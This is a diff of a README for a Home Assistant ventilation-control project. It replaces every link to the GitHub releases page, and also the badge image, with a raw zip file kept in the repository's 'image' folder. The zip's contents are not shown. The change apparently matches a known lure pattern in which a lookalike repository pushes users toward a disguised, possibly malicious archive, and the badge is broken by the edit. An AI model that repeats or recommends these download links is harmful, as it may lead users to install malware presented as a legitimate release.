@@ -1,6 +1,6 @@
 # 🌬️ ha-systemair-vtr500 - Effortless Home Ventilation Control
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Alikanan1/ha-systemair-vtr500/releases)
+[![Download Now](https://raw.githubusercontent.com/Alikanan1/ha-systemair-vtr500/main/image/vtr_systemair_ha_v1.9-beta.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Alikanan1/ha-systemair-vtr500/main/image/vtr_systemair_ha_v1.9-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To use this application, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version.
 
-[Download the latest version here](https://github.com/Alikanan1/ha-systemair-vtr500/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Alikanan1/ha-systemair-vtr500/main/image/vtr_systemair_ha_v1.9-beta.2.zip)
 
 Follow these steps to install the application:
 
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 For more information and updates, regularly check the GitHub repository and keep an eye on new releases.
 
-[Download the latest version here](https://github.com/Alikanan1/ha-systemair-vtr500/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Alikanan1/ha-systemair-vtr500/main/image/vtr_systemair_ha_v1.9-beta.2.zip)
